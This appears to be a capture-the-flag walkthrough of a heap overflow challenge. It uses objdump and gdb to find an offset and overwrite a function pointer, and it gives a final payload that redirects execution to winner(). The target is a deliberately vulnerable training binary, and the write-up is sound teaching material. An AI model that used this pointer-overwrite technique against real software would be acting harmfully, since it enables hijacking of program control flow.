<h2>Goal</h2>

After examining the source code for this challenge, and executing it, the goal is to call the `winner()` function instead of the `nowinner()` function.  

```c
d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();
```
`f->fp()` is set to `nowinner`.  So we must find where in memory the call after `strcpy` occurs.  Lucky for us the value of `fp` is printed out for us, making this task a bit easier.

<h2>Process</h2>

First, I executed heap0 and passed it a valid parameter to verify I understood it properly.

```bash
./heap0 AA
data is at 0x804a008, fp is at 0x804a050
level has not been passed
```

Next, using `objdump` find the value of `winner()`.

```bash
objdump -d heap0 | grep winner
08048464 <winner>:
08048478 <nowinner>:
```

Now to gdb. I disassembled the main function to locate `strcpy` and set a breakpoint after it.

```bash
disas main
......
0x080484f2 <main+102>:	call   0x8048368 <strcpy@plt>
0x080484f7 <main+107>:	mov    eax,DWORD PTR [esp+0x1c]
0x080484fb <main+111>:	mov    eax,DWORD PTR [eax]
......
```
main+107 or main+111 should both be OK to choose as a break point. I set `break *main+111`, then created a payload with 100 bytes to be sure to overflow the 64char buffer of data struct `d`. Then I dumped 100 bytes from the location of `data` as printed by the printf statement. 
`data is at 0x804a008, fp is at 0x804a050`

```bash
x/100x 0x804a008
0x804a008:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a048:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a058:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a068:	0x41414141	0x00000000	0x00000000	0x00000000
```
Looking at the addresses on the left, we can see that the `fp` address was also overwritten. `fp` is at `0x0804a050` and we wrote all the way to `0x804a068`. Looks like we overwrote by 7 addresses, 7addr x 4 bytes = 28.  Let's remove 28 A's.

```bash
r  `python -c 'print "A"*72'`
x/100x 0x804a008
0x804a008:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a048:	0x41414141	0x41414141	0x08048400	0x00000000
```
Ok, `0x804a050` is not overwritten, let's overwrite it with the `winner()` address. I ran this in gdb just incase it didn't work so.  Recall `08048464 <winner>`.  

Final payload: `"A"*72+"\x64\x84\x04\x08"`


<h2>Solution</h2>

Finally:
```bash
./heap0 `python -c 'print "A"*72+"\x64\x84\x04\x08"'`
data is at 0x804a008, fp is at 0x804a050
level passed
```
